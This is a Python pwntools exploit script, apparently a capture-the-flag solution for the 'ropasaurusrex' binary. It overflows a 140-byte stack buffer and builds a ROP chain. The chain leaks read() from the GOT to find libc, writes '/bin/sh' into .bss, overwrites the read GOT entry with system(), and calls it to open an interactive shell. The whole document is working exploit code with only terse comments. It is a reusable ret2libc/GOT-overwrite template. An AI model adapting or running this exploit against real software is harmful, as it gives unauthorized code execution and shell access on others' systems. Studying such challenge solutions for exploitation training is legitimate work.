#!/usr/bin/python

from pwn import *

s = process('./ropasaurusrex', env={'LD_PRELOAD':'./libc.so.6'})

libc = ELF('./libc.so.6')
read_offset = libc.sym['read']
log.success('read_offset = ' + hex(read_offset))

# 0x080484b6 : pop esi ; pop edi ; pop ebp ; ret
pop3ret = 0x080484b6

bss = 0x8049628

write_plt = 0x0804830c
read_plt = 0x0804832c
read_got = 0x804961c

read_binsh_from_stdin_to_bss = p32(read_plt)
read_binsh_from_stdin_to_bss += p32(pop3ret)          # ret
read_binsh_from_stdin_to_bss += p32(0x0)              # stdin
read_binsh_from_stdin_to_bss += p32(bss)              # buf
read_binsh_from_stdin_to_bss += p32(0x8)              # count = len('/bin/sh\x00')               

leak_read_addr = p32(write_plt)
leak_read_addr += p32(pop3ret)                        # ret
leak_read_addr += p32(0x1)                            # stdout
leak_read_addr += p32(read_got)                       # buf
leak_read_addr += p32(0x4)                            # count = len(read)

read_system_from_stdin_to_read_got = p32(read_plt) 
read_system_from_stdin_to_read_got += p32(pop3ret)    # ret
read_system_from_stdin_to_read_got += p32(0x0)        # stdin
read_system_from_stdin_to_read_got += p32(read_got)   # buf
read_system_from_stdin_to_read_got += p32(0x4)        # count = len(system)

call_overwrited_read = p32(read_plt)
call_overwrited_read += 'BBBB'
call_overwrited_read += p32(bss)

payload = 'A' * 140
payload += leak_read_addr
payload += read_binsh_from_stdin_to_bss
payload += read_system_from_stdin_to_read_got
payload += call_overwrited_read

s.sendline(payload)

leak = s.recv(4)
read = u32(leak)
log.success('read = ' + hex(read))

libc.address = read - read_offset
system = libc.sym['system']
log.success('system = ' + hex(system))

s.send('/bin/sh\x00')
s.send(p32(system))

s.interactive()



















